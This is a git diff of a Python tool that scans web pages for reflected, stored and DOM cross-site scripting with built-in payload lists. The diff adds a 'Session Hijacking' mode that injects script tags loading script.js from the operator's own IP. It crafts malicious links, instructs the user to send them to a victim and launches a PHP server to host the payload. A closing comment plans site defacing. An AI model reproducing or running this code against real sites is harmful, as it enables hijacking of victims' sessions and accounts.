@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import requests
 import time
 from selenium import webdriver
@@ -7,6 +8,9 @@ from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertP
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 import urllib.request
+import json
+import subprocess
+
 
 dom_payloads = [
     "<img src=x onerror=alert('DOM-XSS-1')>",
@@ -25,6 +29,7 @@ server_payloads = [
     "'-alert('XSS')-'"
 ]
 
+out = {}
 
 
 def test_server_side_xss(base_url, params_list, mode):
@@ -32,7 +37,7 @@ def test_server_side_xss(base_url, params_list, mode):
 
     for param_to_inject in params_list:
         print(f"=========================================\n[*] Testing param: '{param_to_inject}'")
-
+        out[param_to_inject] = []
         for payload in server_payloads:
             print(f"--- Payload: {payload}")
             try:
@@ -47,6 +52,7 @@ def test_server_side_xss(base_url, params_list, mode):
 
                 if response.status_code == 200 and payload in response.text:
                     print(f"[+] SUCCESS! Payload found in response (param '{param_to_inject}').\n")
+                    out[param_to_inject].append(payload)
                 else:
                     print("[-] FAIL. Payload not found or sanitized.\n")
             except requests.exceptions.RequestException as e:
@@ -79,6 +85,7 @@ def test_dom_xss(base_url, param_name):
                 alert = driver.switch_to.alert
                 alert_text = alert.text
                 print(f"[+] SUCCESS! Found alert: '{alert_text}'\n")
+                out[param_name] = payload
                 alert.accept()
                 continue
             except NoAlertPresentException:
@@ -95,44 +102,126 @@ def test_dom_xss(base_url, param_name):
 
     driver.quit()
 
-def test_stored_xss(session, injection_url, view_url, params_list):
+def test_post_xss(session, injection_url, view_url, params_list):
     print(f"\n[*] Started SERVER POST test with params: {', '.join(params_list)}\n")
     print(f"    Injection URL (POST): {injection_url}")
     print(f"    Checking URL (GET): {view_url}\n")
 
-    params_dict = {p: "test" for p in params_list}
+    params_dict = {p: "test@test.test" if 'email' in p or 'pass' in p else 'test' for p in params_list}
 
     for param_to_attack in params_dict.keys():
-        print(f"================ Testing parameter '{param_to_attack}'")
-        for payload in server_payloads:
+        if "email" in param_to_attack or "pass" in param_to_attack:
+            continue
+        else:
+            print(f"================ Testing parameter '{param_to_attack}'")
+            out[param_to_attack] = []
+            for payload in server_payloads:
+                print(f"--- Payload: {payload}")
+
+                data_to_send = params_dict.copy()
+                data_to_send[param_to_attack] = payload
+
+                try:
+                    print(f"[*] Sending POST to {injection_url} and following redirects...")
+                    inject_response = session.post(injection_url, data=data_to_send,
+                                                   timeout=10)
+
+                    print(f"[+] Server accepted data. Landed on: {inject_response.url}")
+
+                    if payload in inject_response.text:
+                        print(f"[+] SUCCESS! Payload found on the redirect destination page.")
+                        print("[!] Potential Reflected XSS vulnerability found!\n")
+                        out[param_to_attack].append(payload)
+                        continue
+
+                    print("[-] Payload not found after redirect. Checking for Stored XSS...")
+                    time.sleep(1)
+
+                    print(f"[*] Sending separate GET to {view_url} to check...")
+                    view_response = session.get(view_url, timeout=10)
+
+                    if payload in view_response.text:
+                        print(f"[+] SUCCESS! Payload found on the view page.")
+                        print("[!] Potential Stored XSS vulnerability found!\n")
+                        out[param_to_attack].append(payload)
+                    else:
+                        print("[-] FAIL. Payload not found on the view page either.\n")
+
+                except requests.exceptions.RequestException as e:
+                    print(f"[!] Connection error: {e}\n")
+
+def test_session_hijacking(session, base_url, params, vuln_param, mode, ip, port):
+
+    session_hijacking_payloads = [
+        f"<script src=http://{ip}:{port}/script.js></script>",
+        f"'><script src=http://{ip}/script.js></script>",
+        f'"><script src=http://{ip}/script.js></script>',
+        f"javascript:eval('var a=document.createElement(\'script\');a.src=\'http://{ip}/script.js\';document.body.appendChild(a)')",
+        f'<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//{ip}/script.js");a.send();</script>',
+        f'<script>$.getScript("http://{ip}/script.js")</script>'
+    ]
+
+    params_dict = {p: "test@test.test" if 'email' in p or 'pass' in p else 'test' for p in params}
+
+    if mode == '1': #Reflected
+        for payload in session_hijacking_payloads:
+            params_dict[vuln_param] = payload
+
+            encoded_params = urllib.parse.urlencode(params_dict)
+
+            # 5. Собираем финальную ссылку
+            final_crafted_url = f"{base_url}?{encoded_params}"
+
+            # Выводим результат
+            print("--- Payload ---")
+            print(payload)
+            print("\n--- Crafted link ---")
+            print(final_crafted_url)
+    elif mode == '2': #stored
+        for payload in session_hijacking_payloads:
             print(f"--- Payload: {payload}")
 
             data_to_send = params_dict.copy()
-            data_to_send[param_to_attack] = payload
+            data_to_send[param] = payload
 
             try:
-                print(f"[*] Send a POST request to {injection_url}...")
-                inject_response = session.post(injection_url, data=data_to_send, timeout=10)
+                print(f"[*] Sending POST to {base_url} and following redirects...")
+                inject_response = session.post(base_url, data=data_to_send,
+                                               timeout=10)
 
-                if inject_response.status_code in [200, 302]:
-                    print("[+] The injection was successful (the server accepted the data).")
-                else:
-                    print(f"[!] The server responded to the injection with {inject_response.status_code}. Skip the check.")
-                    continue
-
-                time.sleep(1)
-
-                print(f"[*] Send a GET request to {view_url} to check...")
-                view_response = session.get(view_url, timeout=10)
-
-                if payload in view_response.text:
-                    print(f"[+] SUCCESS! Payload found on the view page")
-                    print("[!] Potential Stored XSS vulnerability found!\n")
-                else:
-                    print("[-] FAIL. Payload not found on the view page.\n")
+                print(f"[+] Server accepted data. Landed on: {inject_response.url}")
 
             except requests.exceptions.RequestException as e:
                 print(f"[!] Connection error: {e}\n")
+            print("[*]Just send link to the vulnerable page to the victim\n")
+
+    HOST = ip
+    PORT = port
+    DIRECTORY = "."
+
+    print(f"[*] Starting php server on http://{HOST}:{PORT}...")
+    time.sleep(1)
+    print("[*] Press Ctrl+C to exit...")
+    print("-" * 20)
+
+    command = [
+        "php",
+        "-S",
+        f"{HOST}:{PORT}",
+        "-t",
+        DIRECTORY
+    ]
+
+    try:
+        subprocess.run(command, check=True)
+
+    except KeyboardInterrupt:
+        print("\n" + "-" * 20)
+        print("[*] Server stopped by user.")
+
+    except Exception as e:
+        print(f"\n[!] Error occured: {e}")
+
 
 if __name__ == "__main__":
     print("""                                 __ __                   
@@ -140,9 +229,9 @@ if __name__ == "__main__":
                               /\\__)__)_>(_(_|| || |(/_|  """)
 
     mode = input(
-        "Select a mode:\n 1 - Server POST test (stored)\n 2 - Server multiple GET parameters ISOLATED test (reflected)\n 3 - Server multiple GET parameters test (e.g. /?par=1&par=2...) (reflected)\n 4 - DOM test (one parameter in a URL fragment, #)\n Your choice: ")
+        "Select a mode:\n 1 - Server POST test (stored)\n 2 - Server multiple GET parameters ISOLATED test (reflected)\n 3 - Server multiple GET parameters test (e.g. /?par=1&par=2...) (reflected)\n 4 - DOM test (one parameter in a URL fragment, #)\n 5 - Session Hijacking \nYour choice: ")
 
-    base_url = input("Enter the base URL (without the ‘?’ and ‘#’. for POST test, add page in the end): ")
+    base_url = input("Enter the base URL (without the ‘?’ and ‘#’. for POST test, add page in the end. If using Session Hijacking - paste link on vulnerable stored or reflected): ")
     if mode == '1':
         s = requests.Session()
 
@@ -154,7 +243,7 @@ if __name__ == "__main__":
 
         params_str = input("Enter the parameter names separated by commas: ")
         params = [p.strip() for p in params_str.split(',')]
-        test_stored_xss(
+        test_post_xss(
             session=s,
             injection_url=base_url,
             view_url=base_url,
@@ -171,8 +260,37 @@ if __name__ == "__main__":
     elif mode == '4':
         param = input("Enter the name of the parameter in the URL fragment: ")
         test_dom_xss(base_url, param)
+    elif mode == '5':
+        print("!!! DONT FORGET TO CHANGE IP IN script.js !!!")
+        param = input("Enter the parameter names separated by commas: ")
+        vuln_param = input("Enter the vulnerability parameter name: ")
+        ip = input("Enter your IP address: ")
+        port = input("Enter your port: ")
+        mode = input("Select mode:\n 1 - Reflected XSS\n 2 - Stored XSS \n Your choice: ")
+        if mode == '2':
+            s = requests.Session()
+        else:
+            s = ""
+        test_session_hijacking(s, base_url, param, vuln_param, mode, ip, port)
 
     else:
         print("\n[!] Invalid mode. Restart the script.")
 
+    if out:
+        with open('XSS_vuln_params.json', "w", encoding='utf-8') as f:
+            f.write(json.dumps(out))
+        for key, value in out.items():
+            if value:
+                print(f"XSS found in parameter {key} with payloads {'; '.join(map(str, value))}")
+        print("[*] Results written to file XSS_vuln_params.json")
+    elif mode != '5':
+        print("\n[!] No results were found.")
+
     print("[*] Testing completed.")
+
+
+
+
+
+
+# TODO: Add site defacing
